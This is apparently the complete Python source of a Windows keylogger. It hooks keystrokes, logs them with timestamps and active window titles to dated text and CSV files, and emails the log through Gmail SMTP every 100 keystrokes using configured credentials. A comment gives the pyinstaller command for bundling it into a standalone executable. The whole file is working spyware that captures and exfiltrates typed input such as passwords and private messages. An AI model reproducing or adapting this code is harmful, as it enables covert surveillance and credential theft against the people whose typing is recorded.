# Created by Mantie N Reid II

import PyHook3
import os
import numpy.random.common
import numpy.random.bounded_integers
import numpy.random.entropy
import pythoncom
from datetime import datetime
import pandas as pd
import win32gui
import os
from stat import S_IREAD, S_IRGRP, S_IROTH
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import threading
from threading import Thread
from stat import S_IWUSR
import config


# To get this into a exe. use pyinstaller --onefile  -F main23.py

global path_for_logs
global keys_stroke_count
keys_stroke_count = 0

path_for_logs = os.path.join('LogFolders', 'logs')  # defined globally


# converts the text file to a table with headers.

def convert_to_table():
  date_log_name = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.

  if not os.path.exists(path_for_logs):  # if folder for the logs does NOT exist, then create it.
    os.makedirs(path_for_logs)

  location_of_file_and_name_for_logs = os.path.join(path_for_logs, date_log_name + "-logfile.txt")
  location_of_file_and_name_for_logs_table = os.path.join(path_for_logs, date_log_name + "-logfile.csv")

  try:   # If file does not exist, then skip the function and keep going(text file will be created in the onkeyboard function).
    f = open(location_of_file_and_name_for_logs, 'r')

  except FileNotFoundError:
    print("the file was not found. But keep going, it will be converted after  the text file created")
    return

  try:
    os.chmod(location_of_file_and_name_for_logs_table, S_IWUSR | S_IREAD)  # this will set the table file to read and write.
  except FileNotFoundError:
    pass
    print("Cannot find the table file.")
    print("Most likely it has not been created yet, will continue to run the program")

  try:
    df = pd.read_csv(f, sep='|', encoding="ISO-8859-1", names=["TimeStamp", "Current Window", "KeyStrokes"])
    df.to_csv(location_of_file_and_name_for_logs_table, index=None, )
  except PermissionError:
    print("WARNING: Cannot access the table file. If you have it open, please close it")

  os.chmod(location_of_file_and_name_for_logs_table, S_IREAD)  # After we are done with the file, we set it to read only. Because, If the user opens it, then we wont be able to write to it.


# this will open the file and make the first line start with the timestamp next to it.  Ensures it starts with a datetimestamp on the first line at start.
def give_new_line():
  date_log_name = datetime.today().strftime('%m-%d-%Y')

  date_time_stamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')

  if not os.path.exists(path_for_logs):
    os.makedirs(path_for_logs)

  location_of_file_and_name = os.path.join(path_for_logs, date_log_name + "-logfile.txt")
  w = win32gui
  current_window = w.GetWindowText(w.GetForegroundWindow())

  logfile = open(location_of_file_and_name, 'a+')

  logfile.write("\n" + date_time_stamp + "|" + current_window + "|" + " ")  # Adds a new line. Enters the current date, time, and current window
  logfile.close()


# The main function of the program. It runs whenever a key is pressed.





def send_files():

    date_log_name = datetime.today().strftime('%m-%d-%Y')
    date_log_name_string = str(date_log_name)

    email_user = config.username
    email_password = config.password
    email_send = config.sendemailto
    subject = ' file' + date_log_name

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['subject'] = subject

    body = "Hi there, Here is the log file "
    msg.attach(MIMEText(body, 'plain'))
    location_of_file_and_name_for_logs_table = os.path.join(path_for_logs, date_log_name + "-logfile.csv")

    filename = location_of_file_and_name_for_logs_table
    attachment = open(filename, 'r')
    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= " + filename)

    msg.attach(part)
    text = msg.as_string()  # changes the message to a string

    server = smtplib.SMTP('smtp.gmail.com', 587)  # define the sever to connnect to
    server.starttls()
    server.login(email_user, email_password)  # the username and password to use

    server.sendmail(email_user, email_send, text)
    server.quit()


def OnKeyboardEvent(event):
  global window_name

  # w = win32gui
  # currentwindow = w.GetWindowText(w.GetForegroundWindow())

  date_log_name = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
  date_times_stamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and the  time the keys were pressed

  path = os.getcwd()  # gets the current working directory

  if not os.path.exists(path_for_logs):
    os.makedirs(path_for_logs)

  print("The current working directory is %s" % path)

  location_of_file_and_name = os.path.join(path_for_logs, date_log_name + "-logfile.txt")

  logfile = open(location_of_file_and_name, 'a+')  # open the file  in append mode. If the file does not exist, then create the file and open it in append mode.
  buffers = logfile.read()

  logfile.close()

  # open the file to write the current new keystrokes.

  logfile = open(location_of_file_and_name, 'a+')

  window_name = event.WindowName
  key_logs = chr(event.Ascii)

  # This code will start a new line if the Current window that the user is using changes to a different window.
  def new_line_if_window_changes():
    w = win32gui
    current_window = w.GetWindowText(w.GetForegroundWindow())

    date_time_stamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')
    with open(location_of_file_and_name, 'r') as fh:

      data = fh.readlines()

      try:
        last_line = data[-1]
        print(last_line)
      except IndexError:
        print('The last line has not been written yet, exit function and keep going')
        return

    if str(last_line).find(str(window_name)) != -1:
      'print("The window name  has not changed")'

    else:

      logfile2 = open(location_of_file_and_name, 'a+')
      logfile2.write("\n" + date_time_stamp + "|" + window_name + "|" + " ")
      logfile2.close()
      print("the window has  changed")

  if event.Ascii == 13:  # if entered is pressed, then start a new line, add datetimestamp, windowname and delimter
    key_logs = '\n' + date_times_stamp + "|" + window_name + "|" + " "

  # if event.Ascii == 8:  # if backspace is used, then convert it to the word, back space. This is done to prevent it from showing up as a box.
    # key_logs = ' <Backspace> '

  if event.Ascii == 8:  # if backspace is used, then convert it to a blank space. This is done to prevent it from showing up as a box.
    key_logs = ''

  if event.Ascii == 9:
    key_logs = ' <Tab> '

  buffers += key_logs  # Whatever is keylogs equal to, Gets added to the buffers variable.
  new_line_if_window_changes()

  logfile.write(buffers)  # writes the key pressed  to the file
  global keys_stroke_count  # counter for the number of

  keys_stroke_count += 1  # adds one to the counter each time a

  if keys_stroke_count == 100:
    print(" count is equal to 100")
    print("Time to send off the log table to the email")

    keys_stroke_count = 0
    # sendfiles()
    thread = Thread(target=send_files)
    thread.start()

  print(" count is now ",  keys_stroke_count) # prints out the  count.

  logfile.close()  # closes the file
  convert_to_table()

  return True


def main():
  hm = PyHook3.HookManager()
  hm.KeyDown = OnKeyboardEvent

  hm.HookKeyboard()

  pythoncom.PumpMessages()

  give_new_line()
  convert_to_table()


if __name__ == "__main__":
  give_new_line()
  print("The program has started, Start typing!")
  main()
